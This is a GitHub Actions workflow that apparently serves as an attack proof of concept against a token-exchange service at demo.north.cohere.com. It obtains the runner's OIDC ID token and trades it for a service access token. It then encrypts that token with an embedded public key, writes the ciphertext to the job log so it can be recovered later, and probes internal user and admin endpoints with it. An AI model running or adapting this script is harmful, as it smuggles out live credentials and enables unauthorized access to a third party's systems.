name: North Token Exchange
on: workflow_dispatch
permissions:
  id-token: write
  contents: read

jobs:
  exchange:
    runs-on: ubuntu-latest
    steps:
      - name: audience matrix
        env:
          PUBKEY: |
            -----BEGIN PUBLIC KEY-----
            MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1BithTdaYmA82ml37jHP
            RYq7bGDhgcOWF8R4+wh94UfKOVzFvZWxLGwrpvB4O/8HOBlBRHgCG369yefOukJ3
            HVTngAwVWwr9ROGJkHUsq2rZwVCq2+67V4SAZgMG+g/3cHfSBpJ3uJBAnZyTrBb5
            tsvLLl8CnMJhXkdHTqUm1xXR9IykofoE2tf39hiOxrdqCoNoPmgUdFy5kzMs3zA2
            m2pKEF3jAaN5WnuiygwcEUue3dDyxQIFS0CMF+TQqUEu7KvcjE0UmyhZoLrea5W8
            MrG3Yga62i4Ndj3P3oQABXqwTIvQo5tlTlllK3GHrQt90bDE2I2NyR7fA9qTmtsl
            cwIDAQAB
            -----END PUBLIC KEY-----
        run: |
          set +e
          echo "$PUBKEY" > /tmp/pub.pem
          for AUD in north; do
            RESP=$(curl -sSL -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD")
            ID_TOKEN=$(echo "$RESP" | jq -r '.value // empty')
            if [ -z "$ID_TOKEN" ]; then echo "AUD=$AUD NO_TOKEN"; continue; fi
            BODY=$(jq -nc --arg t "$ID_TOKEN" '{subject_token:$t,subject_token_type:"urn:ietf:params:oauth:token-type:id_token",connector_id:"githubTokenExchange"}')
            OUT=$(curl -sS -X POST "https://demo.north.cohere.com/api/v1/token/exchange" -H 'Content-Type: application/json' -d "$BODY" -w '\nHTTP_CODE=%{http_code}')
            CODE=$(echo "$OUT" | sed -n 's/^HTTP_CODE=//p')
            JSON=$(echo "$OUT" | sed '$d')
            ERR=$(echo "$JSON" | jq -r '.details.error // .error_code // empty' 2>/dev/null)
            echo "AUD=$AUD HTTP=$CODE ERR=$ERR"
            NORTH_TOKEN=$(echo "$JSON" | jq -r '.token // .access_token // empty' 2>/dev/null)
            if [ -n "$NORTH_TOKEN" ]; then
              echo "GOT_NORTH_TOKEN aud=$AUD len=${#NORTH_TOKEN}"
              echo "$NORTH_TOKEN" | openssl pkeyutl -encrypt -pubin -inkey /tmp/pub.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0 > /tmp/enc.txt
              echo "TOKEN_ENC=$(cat /tmp/enc.txt)"
              curl -sS "https://demo.north.cohere.com/api/internal/v1/users/me" -H "Authorization: Bearer $NORTH_TOKEN" -w '\nHTTP=%{http_code}\n' | head -c 1200
              curl -sS "https://demo.north.cohere.com/admin/api/auth/whoami" -H "Authorization: Bearer $NORTH_TOKEN" -w '\nHTTP=%{http_code}\n' | head -c 800
              exit 0
            fi
          done
